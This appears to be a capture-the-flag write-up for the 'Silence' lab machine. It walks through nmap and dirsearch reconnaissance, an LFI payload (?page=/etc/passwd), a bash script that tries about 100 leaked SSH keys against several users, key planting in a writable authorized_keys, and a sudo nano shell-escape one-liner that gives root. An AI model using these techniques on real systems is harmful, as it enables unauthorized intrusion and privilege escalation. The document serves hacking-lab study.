![image](https://user-images.githubusercontent.com/87468669/220750361-2f97cf1d-7e7d-4853-b097-787594ec3faa.png)

first start enumeration with nmap.

```
# Nmap 7.93 scan initiated Wed Feb 22 21:26:21 2023 as: nmap -sC -sV -T4 -oN normal.tcp -p 21,80,139,445,1055 -Pn 10.150.150.55
Nmap scan report for 10.150.150.55
Host is up (0.19s latency).            
                                         
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd
| ftp-syst:                             
|   STAT:                              
| FTP server status:                                                               
|      Connected to ::ffff:10.66.67.146                                            
|      Logged in as ftp                                                            
|      TYPE: ASCII
|      No session bandwidth limit                                                  
|      Session timeout in seconds is 300                                           
|      Control connection is plain text                                            
|      Data connections will be plain text  
|      At session startup, client count was 2      
|      vsFTPd 3.0.3 - secure, fast, stable 
|_End of status                                                                    
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                        
|_-rw-r--r--    1 0        0              13 Jun 12  2020 test
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 4.6.2                                                                                                                           
445/tcp  open  netbios-ssn Samba smbd 4.6.2
1055/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
                                         
Host script results:
|_clock-skew: 39m10s                                                               
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time:                                                                                                                                                          
|   date: 2023-02-22T21:05:47                                                                                                                                         
|_  start_date: N/A
| smb2-security-mode:                                                              
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 22 21:26:41 2023 -- 1 IP address (1 host up) scanned in 20.29 seconds
```

![image](https://user-images.githubusercontent.com/87468669/220751664-8713f0b1-e433-4bd2-ac49-0476d0c671ba.png)

noticed a webserver running on port 80, opening it on a browser, we got directed to an apache default webpage. checking the page source we got nothing, let's burst hidden dirs

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/Silence/private]
└─$ dirsearch -u http://10.150.150.55/ -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/n16hth4wk/.dirsearch/reports/10.150.150.55/-_23-02-22_21-41-53.txt

Error Log: /home/n16hth4wk/.dirsearch/logs/errors-23-02-22_21-41-53.log

Target: http://10.150.150.55/

[21:41:54] Starting: 
[21:42:27] 200 -    2KB - /index.php                                        
[21:42:27] 200 -   11KB - /index.html                                       
[21:42:37] 200 -   69KB - /info.php                                         
[21:43:10] 403 -  278B  - /server-status
[21:43:10] 403 -  278B  - /server-status                                    
                                                                             
Task Completed
```
cool let's check out 👀 the `/index.php` dir. 

![image](https://user-images.githubusercontent.com/87468669/220754927-bb313aa8-2486-4d9c-b762-b4e63fd9cc3f.png)

cheking the `index.php` dir, we got directed to a file browser and looking at the page we can see a potential hint `Path is not a directory`. 🤔 what can we do with that?. 

![image](https://user-images.githubusercontent.com/87468669/220756552-2dbf3871-6745-49a5-b8e3-75613357f506.png)

after playing around for some time, added `?path=/` to the `index.php` parameter. and boom we got something sweet 😅. let's play around more to see if we can get anything.

![image](https://user-images.githubusercontent.com/87468669/220761090-b751dead-39e7-485e-9c06-e45910f91798.png)

playing around, cheching dirs and file in the home dir, we got to see some files that looks like web files in `/home/sally/.ssh`... hmmmm 🤔 what are they doing in .ssh dir?

![image](https://user-images.githubusercontent.com/87468669/220761679-1fec7491-3149-471f-80e4-30640554af18.png)

also noticed a `SSHArchiveBackup.tar.gz` file in `/home/sally/backup/` dir. trying to access them directly was not working, let's try check those filels we saw earlier in the .ssh dir.

![image](https://user-images.githubusercontent.com/87468669/220762536-265546a8-574e-450c-b4c9-099b92f33717.png)

testing the files one by one, the `trick.php` looked sus, looks like a potential lfi path. let's test for lfi.

![image](https://user-images.githubusercontent.com/87468669/220765931-90e1c817-9205-4b04-9c13-0dcb6e61b475.png)

by just testing for common lfi parameter `?page=/etc/passwd` we hit the bull's eye. remember in the demo file browser page we got a backup.tar.gz file, let's try download it through the lfi vuln.

![image](https://user-images.githubusercontent.com/87468669/220766928-36263cfc-7e54-48ff-9e86-6b51c1d04fa8.png)

downloaded and extracted the content of the backup file. we got a directory `private`. let's check what's under the dir.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/Silence/private]
└─$ ls -al                                                                         
total 408                                                                          
drwxr-xr-x 2 n16hth4wk n16hth4wk 4096 Jun 11  2020 .       
drwxr-xr-x 3 n16hth4wk n16hth4wk 4096 Feb 22 22:47 ..      
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa1 
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa10
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa100
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa11
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa12
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa13
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa14
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa15
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa16
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa17
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa18
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa19
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa2 
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa20
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa21
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa22
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa23
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa24
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa25
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa26
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa27
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa28
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa29
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa3 
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa30
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa31
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa32
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa33
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa34
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa35
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa36
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa37
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa38            
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa39
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa4                         
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa40                        
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa41
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa42
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa43
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa44
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa45 
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa46
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa47
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa48
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa49
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa5 
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa50
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa51
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa52
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa53
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa54
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa55
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa56
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa57
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa58
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa59
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa6 
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa60
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa61
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa62
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa63
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa64
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa65
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa66
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa67
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa68
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa69
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa7 
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa70
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa71
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa72            
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa73
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa74
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa75
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa76
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa77
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa78
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa79
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa8 
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa80
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa81
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa82
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa83
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa84
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa85
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa86
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa87
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa88
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa89
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa9 
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa90
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa91
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa92
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa93
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa94
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa95
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa96
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa97
-rw------- 1 n16hth4wk n16hth4wk 2590 Jun 11  2020 id_rsa98
-rw------- 1 n16hth4wk n16hth4wk 2602 Jun 11  2020 id_rsa99
```
wow! 😧 these are lots of id_rsa key files, we either run it manually or script our way out. let's write a script that automate this for us.

```
#!/bin/bash
#a simple automatic ssh login using id_rsa 
#
read -p "Enter Username: " user

if [ -z "$user" ]
then
        echo "[+] Simple autossh Script"
        echo "[-] Are you drunk? supply a username" 
        exit 0
fi

#if username is specified 
#
for i in id_rsa*
do 
        echo $i
        ssh -p 1055 -o "PreferredAuthentications=publickey" $user@10.150.150.55 -i $i
done
```
now we have a script, dont forget to make it executable with `chmod +x script.sh`.

![image](https://user-images.githubusercontent.com/87468669/220805119-743978f2-9236-4120-aa3d-575f9d4f677f.png)

remember in the `/etc/passwd` file, these are the users available.

```
gary
john
sally
alice
```
Now let's run our script and input username gary first.

![image](https://user-images.githubusercontent.com/87468669/220806191-2083884d-9bf8-4530-b36c-ddb837df1f59.png)

cool we are in as `gary`, let's keep running the script on other users and try escalate privs with this user. After much playing around, got nothing.

![image](https://user-images.githubusercontent.com/87468669/220808581-da44ebb0-da5c-4199-8665-daed95721b2a.png)

while running the script we logged in as user `sally`. let's try escalate privs.

```
sally@ubuntu:/home/john$ cd .ssh/
sally@ubuntu:/home/john/.ssh$ ls -al
total 12
drwxrwx---  2 john netAdmin 4096 Jul  4  2020 .
drwxr-xr-x 14 john john     4096 Jul  1  2020 ..
-rw-rw-r--  1 john netAdmin 1118 Jul  4  2020 authorized_keys
sally@ubuntu:/home/john/.ssh$ id
uid=1003(sally) gid=1003(sally) groups=1003(sally),1006(netAdmin)
```
we can see we have access to john `.ssh` dir, let put our local pub key content in the `authorized_keys`.

```
sally@ubuntu:/home/john/.ssh$ ls -al
total 20
drwxrwx---  2 john  netAdmin 4096 Feb 23 11:11 .
drwxr-xr-x 14 john  john     4096 Jul  1  2020 ..
-rw-rw-r--  1 john  netAdmin 1118 Jul  4  2020 authorized_keys
-rw-------  1 sally sally    2602 Feb 23 11:11 id_rsa
-rw-r--r--  1 sally sally     566 Feb 23 11:11 id_rsa.pub
sally@ubuntu:/home/john/.ssh$ nano authorized_keys
sally@ubuntu:/home/john/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj86vaHjP5PJz/y1QNNidOTXXLq1s+LcBUbh5Xp3ebH9pZBVZe/kI2m1rG7SDhPIJUBOViodr4gmdLeXqupxmlNVfqHXr02HJB+YWjVieDRkDeuehvGSOb+bPuDDcJWOfhIevbsBW9nYK7Y+lAONEF31OwsS9QnB5lIOaTU5cwnjtJQul5xrityC02kQ/5aCLtb0mF4xKuez3pIBe1CBEyCB/3j7Rj0ibkTkiwseBuWXQi08oL7mTEs6HRmnr6CPsCw0diG1nbdxSRCOJM0nAzL9zZQ8SLEIncVq+sDO7oSfKSaTCV9cjVso0zHK5lrGdSD4jub95fDjteKjN59j5Q0tFeOFPmDdWecmrmmbFfQkU3bHjdPkB7FD7ycMtdwVJRSOvL6cOaKywdCZuqdWZokWUQIDdveIdTsDrpOyHW7g1Z9tWNP8hUQmrkIvfKkBTOAyHXiHBewyhldTWJfMp0b4Hy5/rzas9RYs5xKbmi74+51TIeZg7iShtmjDZ700E= n16hth4wk@n16hth4wk-sec
sally@ubuntu:/home/john/.ssh$ 
```
cool 😺 now let's ssh as user john using our own `id_rsa` key.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/pwntilldawn/Silence/private]
└─$ ssh -i ~/.ssh/id_rsa john@10.150.150.55 -p 1055
Silence Please
Last login: Sat Jul  4 02:27:27 2020 from 10.210.210.55
$ /bin/bash
john@ubuntu:~$ id 
uid=1002(john) gid=1002(john) groups=1002(john),1006(netAdmin)
john@ubuntu:~$ whoami
john
john@ubuntu:~$ 
```
Bull's eye 🎯 we got in as john. let's escalate privs 

```
john@ubuntu:~$ sudo -l
Matching Defaults entries for john on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, logfile=/var/log/sudo.log

User john may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/nano
john@ubuntu:~$ 
```
by just doing `sudo -l` we can see that user john is allowed to run `/usr/bin/nano` as sudo without password. let's take advantage of this 

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![image](https://user-images.githubusercontent.com/87468669/220812034-ab80a103-9985-4cc3-af03-75df591e3b35.png)

running the command above droped us in a root shell. And we are through

